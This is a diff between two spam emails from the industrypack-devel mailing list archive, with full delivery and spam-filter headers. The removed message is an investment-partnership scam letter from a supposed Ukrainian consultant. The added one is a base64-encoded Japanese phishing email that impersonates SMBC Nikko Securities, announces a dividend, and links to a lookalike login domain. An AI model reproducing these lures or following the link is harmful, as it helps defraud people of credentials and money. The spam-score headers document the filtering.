@@ -2,81 +2,101 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 77F49B36DDD
-	for <lists+industrypack-devel@lfdr.de>; Tue, 26 Aug 2025 17:32:37 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 8F251B372E1
+	for <lists+industrypack-devel@lfdr.de>; Tue, 26 Aug 2025 21:12:46 +0200 (CEST)
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
-	d=lists.sourceforge.net; s=beta; h=Content-Type:Cc:Reply-To:From:
-	List-Subscribe:List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:
-	Subject:MIME-Version:Message-ID:Date:To:Sender:Content-Transfer-Encoding:
+	d=lists.sourceforge.net; s=beta; h=Content-Transfer-Encoding:Content-Type:
+	Reply-To:From:List-Subscribe:List-Help:List-Post:List-Archive:
+	List-Unsubscribe:List-Id:Subject:MIME-Version:Date:To:Message-ID:Sender:Cc:
 	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
-	bh=TDcRCtaYecmgaNB/vbpXwhIa+8myHXtEneMj9pwTSaw=; b=NNA/7stsgZUgC3UN546QCxqalj
-	5H3y2wvwCtvwwYhQ2s9fB8B9qD9tuzTo66yfeNpiSVzD5PJC7iYDB0oqwu8myLyYTByjYVQeCCNCY
-	dNqGR9qfyP0nEqMLZi6V+7D/En8uiCrCVVk+1pRg+FmFUQMGK+4ooZNNExlO6ZzD/yOU=;
+	bh=F37Em0np2MmK1dvXUyr/zt4EGs856tvuX4dQnEzD9Ck=; b=Avrcc4hn5NGF8DeaSy/4b5qKw7
+	hvKt4MyX+xQaCaJeHHHIZninvJgIrhYl4y0YItCf2A50s9XwNrFWvjsgYsEjZsImZJYn6H68Asaw+
+	Gsu7D+5YSf7nyqtGLae0UZHDITurMkoEpYOznSMa11IAimuXWA3hPkgX7hTOnFxraqpI=;
 Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
 	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1uqvf2-0002BO-BH
+	id 1uqz65-0006vR-9v
 	for lists+industrypack-devel@lfdr.de;
-	Tue, 26 Aug 2025 15:32:36 +0000
+	Tue, 26 Aug 2025 19:12:45 +0000
 Received: from [172.30.29.66] (helo=mx.sourceforge.net)
  by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <newsletter@mgotlrdnmix.net>) id 1uqvf1-0002BH-3B
+ (envelope-from <send_mail213@villagews.shop>) id 1uqz64-0006vK-GC
  for industrypack-devel@lists.sourceforge.net;
- Tue, 26 Aug 2025 15:32:35 +0000
+ Tue, 26 Aug 2025 19:12:44 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
- :Message-ID:Date:Subject:To:From:Reply-To:Sender:Cc:Content-ID:
+ d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
+ MIME-Version:Date:To:From:Message-ID:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=jQZM3sFJBIdLHZslgyyN3OfflVxerrGBg5Hsq8P3RmA=; b=Zq70sjVVaCucCJB0kRZQa6ebIN
- WBTlkb0Wrv905+upLmLtrOvLwjb3+aWt2nQDlIsMeaxYpEVZnWin3y5E3o6mqoMFYkR8dVJXK5mdL
- uI3SzptuP5Ul4ZWI1jLNcd/C93Qs5Q6vjVNhXDr9eZ/Li+hnax5zOZ7G9LQrqZXrKy6Y=;
+ bh=VCzF3dnZSj116ivZAZmTwfR4P5dlgARP+2WrjE+yzLw=; b=i+uHDAezmsLmqEk3kOQSj2z7d6
+ PNhe69lb0JbTVmIGOFfKbHV0C9MbmBTFgE/KjQOd690OdupVZSdt8VLzTM4q24hWo4GDwo31Ci2IJ
+ gnX0LhZbRd+Vc/9JcKEZgrq5id/s6EAjLR8fu/k5+zerWoib4Ij/syofd/R7Iiu56wEc=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
- Subject:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date
- :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Date:To:From:
+ Message-ID:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
+ Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=jQZM3sFJBIdLHZslgyyN3OfflVxerrGBg5Hsq8P3RmA=; b=O
- 5J5Zdx/461ODWgUA6y7CLXeUiKKN7WoIk9BzcH4ZIF9yTKaR3y8acMpYr7jnhi5oFFtVEpQDKqJ24
- 0zHsNlJMraJx0XPqBrzyjh1HTTVMIHnY2e+K3m4s3n9v4J3XAJmGWfGIXImLpwIkP9WGcwxjQgtqo
- FyV9Cf1fiP3Olb0s=;
-Received: from [173.249.193.138] (helo=mgotlrdnmix.net)
- by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
- id 1uqvf0-0007Gk-Ko for industrypack-devel@lists.sourceforge.net;
- Tue, 26 Aug 2025 15:32:35 +0000
-To: industrypack-devel@lists.sourceforge.net
-Date: 26 Aug 2025 17:32:24 +0200
-Message-ID: <20250826173224.B6883205010D5685@mgotlrdnmix.net>
+ List-Owner:List-Archive; bh=VCzF3dnZSj116ivZAZmTwfR4P5dlgARP+2WrjE+yzLw=; b=M
+ YSvbxvX1BjvIGquZh+cjZ7HdMl23wj5jkusi/miDAcad0KPFJbDvn6+j2KwzI01miksK8/cMVyegN
+ pCLeEEM8ocMCX/3rcA7TquAxvnyjtLxuXNQrrzp/LhtVEPTGomDdeTdkAkB1CBg52MCvoFE/WJNCt
+ ZnlZ8/rYopkjkWxY=;
+Received: from [202.134.249.233] (helo=mail0.villagews.shop)
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtps
+ (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
+ id 1uqz63-00015s-OY for industrypack-devel@lists.sourceforge.net;
+ Tue, 26 Aug 2025 19:12:44 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
+ d=villagews.shop; 
+ h=Message-ID:From:To:Subject:Date:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=send_mail213@villagews.shop;
+ bh=VCzF3dnZSj116ivZAZmTwfR4P5dlgARP+2WrjE+yzLw=;
+ b=LnndOP/HKrJEiHZK/lqzAf94S5CT8jhr5e4QXHP96cHAOdy/yaUw+nLSRlWdsc5m32O3tcMU7M+H
+ pYzozu6RNoTyRM5JzJzYIhRCo+AGUk/BHcetWiD95JV/5ppHRiXBhx5rXRvVCUpEXDNnhwOMCgv+
+ Jm6xSRCVdPkvXJVcJco=
+Message-ID: <029a2902df13a139545b086625c4e1d7@villagews.shop>
+To: "industrypack-devel@lists.sourceforge.net"
+ <industrypack-devel@lists.sourceforge.net>
+Date: Wed, 27 Aug 2025 02:52:30 +0800
 MIME-Version: 1.0
-X-Helo-Check: bad, Forged Random Domain (mgotlrdnmix.net)
-X-Spam-Score: 4.9 (++++)
-X-Spam-Report: Spam detection software,
- running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
- has NOT identified this incoming email as spam.  The original
+X-Spam-Score: 8.4 (++++++++)
+X-Spam-Report: Spam detection software, running on the system "sfi-spamd-1.hosts.colo.sdot.me",
+ has identified this incoming email as possible spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview:  Dear industrypack-devel, I hope you're doing well. My name
- is Mr. Timo Peltomaa, and I have spent over 46 years in politics and as a
- consultant,
- working closely with the Ukrainian government on various procurement
- projects. T [...] 
- Content analysis details:   (4.9 points, 5.0 required)
- pts rule name              description
+ 
+ Content preview:  いつもＳＭＢＣ日興証券をご利用いただき、ありがとうございます。
+    お客様のお取引口座に配当金が入金されましたのでお知らせいたします。
+    詳細はパソコンから日興イージートレードにログイン後、「お取引履歴」�
+    [...] 
+ 
+ Content analysis details:   (8.4 points, 5.0 required)
+ 
+  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
- 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
- 0.0 HTML_MESSAGE           BODY: HTML included in message
- 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
- 2.5 FREEMAIL_FORGED_REPLYTO Freemail in Reply-To, but not From
- 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
-X-Headers-End: 1uqvf0-0007Gk-Ko
-Subject: [Industrypack-devel] Partnership Opportunity for Investment and
- Relocation
+ -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from author's
+                             domain
+ -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
+                             envelope-from domain
+ -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
+  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily valid
+  0.6 FROM_FMBLA_NEWDOM28    From domain was registered in last 14-28 days
+  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
+  0.6 CTE_8BIT_MISMATCH      Header says 7bits but body disagrees
+  1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL blocklist
+                             [URI: villagews.shop]
+  1.7 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
+  2.4 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+                             [cf: 100]
+  0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
+X-VA-Spam-Flag: YES
+X-Spam-Flag: YES
+X-Headers-End: 1uqz63-00015s-OY
+Subject: [SPAM] 【ＳＭＢＣ日興証券】配当金入金お知らせメール
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -88,113 +108,21 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-From: Timo Paltomaa via Industrypack-devel
+From: =?utf-8?B?44GU6YCa55+l?= via Industrypack-devel
  <industrypack-devel@lists.sourceforge.net>
-Reply-To: PaltomaaTimo@yandex.ru
-Cc: Timo Paltomaa <newsletter@mgotlrdnmix.net>
-Content-Type: multipart/mixed; boundary="===============4331514682573859544=="
+Reply-To: =?utf-8?B?44GU6YCa55+l?= <send_mail213@villagews.shop>
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: base64
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
---===============4331514682573859544==
-Content-Type: text/html
-Content-Transfer-Encoding: quoted-printable
-
-<!DOCTYPE HTML>
-
-<html><head><title></title>
-<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
-</head>
-<body style=3D"margin: 0.4em;"><p style=3D"color: rgb(34, 34, 34); text-tra=
-nsform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial,=
- Helvetica, sans-serif; font-size: small; font-style: normal; font-weight: =
-400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-va=
-riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
-th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
-; text-decoration-color: initial;">
-Dear industrypack-devel,</p>
-<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
-ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
-pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
-font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
-oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
-initial; text-decoration-color: initial;">
-I hope you're doing well. My name is Mr. Timo Peltomaa, and I have spent ov=
-er 46 years in politics and as a consultant, working closely with the Ukrai=
-nian government on various procurement projects. Though originally from Swe=
-den, I moved to Ukraine at the age of four, and I have lived there ever sin=
-ce with my Ukrainian wife, who sadly passed away recently due to the ongoin=
-g conflict.</p>
-<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
-ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
-pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
-font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
-oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
-initial; text-decoration-color: initial;">
-In light of this, I am now looking to start a new chapter abroad with my ch=
-ildren. As part of this transition, I&#8217;m interested in exploring inves=
-tment opportunities, particularly in real estate&#8212;whether residential,=
- commercial, or tourism-related&#8212;or other high-return ventures.</p>
-<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
-ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
-pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
-font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
-oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
-initial; text-decoration-color: initial;">
-After reviewing your background and reputation in the entrepreneurial secto=
-r, I believe there could be an opportunity for us to collaborate. I&#8217;m=
- looking for a trusted partner who can help me navigate this transition and=
- establish a new investment portfolio, and I&#8217;m open to offering a per=
-centage of the investment opportunities in return for your expertise and as=
-sistance.</p>
-<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
-ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
-pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
-font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
-oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
-initial; text-decoration-color: initial;">
-If this is something that interests you, I&#8217;d love to discuss it furth=
-er. I&#8217;d also appreciate learning more about you and your work. Should=
- you not be able to assist, kindly let me know, and I&#8217;ll explore othe=
-r options.</p>
-<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
-ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
-pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
-font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
-oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
-initial; text-decoration-color: initial;">
-Thank you for taking the time to read this. I look forward to hearing from =
-you soon.</p>
-<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
-ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
-pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
-font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
-oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
-initial; text-decoration-color: initial;">
-Best regards,<br>Mr. Timo Paltomaa</p></body></html>
-
-
---===============4331514682573859544==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-
---===============4331514682573859544==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-Industrypack-devel mailing list
-Industrypack-devel@lists.sourceforge.net
-https://lists.sourceforge.net/lists/listinfo/industrypack-devel
-
---===============4331514682573859544==--
+44GE44Gk44KC77yz77yt77yi77yj5pel6IiI6Ki85Yi444KS44GU5Yip55So44GE44Gf44Gg44GN
+44CB44GC44KK44GM44Go44GG44GU44GW44GE44G+44GZ44CCCgrjgYrlrqLmp5jjga7jgYrlj5bl
+vJXlj6PluqfjgavphY3lvZPph5HjgYzlhaXph5HjgZXjgozjgb7jgZfjgZ/jga7jgafjgYrnn6Xj
+gonjgZvjgYTjgZ/jgZfjgb7jgZnjgIIK6Kmz57Sw44Gv44OR44K944Kz44Oz44GL44KJ5pel6IiI
+44Kk44O844K444O844OI44Os44O844OJ44Gr44Ot44Kw44Kk44Oz5b6M44CB44CM44GK5Y+W5byV
+5bGl5q2044CN55S76Z2i44KI44KK44GU56K66KqN44GP44Gg44GV44GE44CCCgrilrzjgYrlj5bl
+vJXlsaXmrbQKaHR0cHM6Ly93d3cuc21pYmNpb3NlYy5hbGV4aWFlLmNvbQoK55m66KGMIO+8miDv
+vLPvvK3vvKLvvKPml6XoiIjoqLzliLjmoKrlvI/kvJrnpL4KCgoKX19fX19fX19fX19fX19fX19f
+X19fX19fX19fX19fX19fX19fX19fX19fX19fX18KSW5kdXN0cnlwYWNrLWRldmVsIG1haWxpbmcg
+bGlzdApJbmR1c3RyeXBhY2stZGV2ZWxAbGlzdHMuc291cmNlZm9yZ2UubmV0Cmh0dHBzOi8vbGlz
+dHMuc291cmNlZm9yZ2UubmV0L2xpc3RzL2xpc3RpbmZvL2luZHVzdHJ5cGFjay1kZXZlbAo=
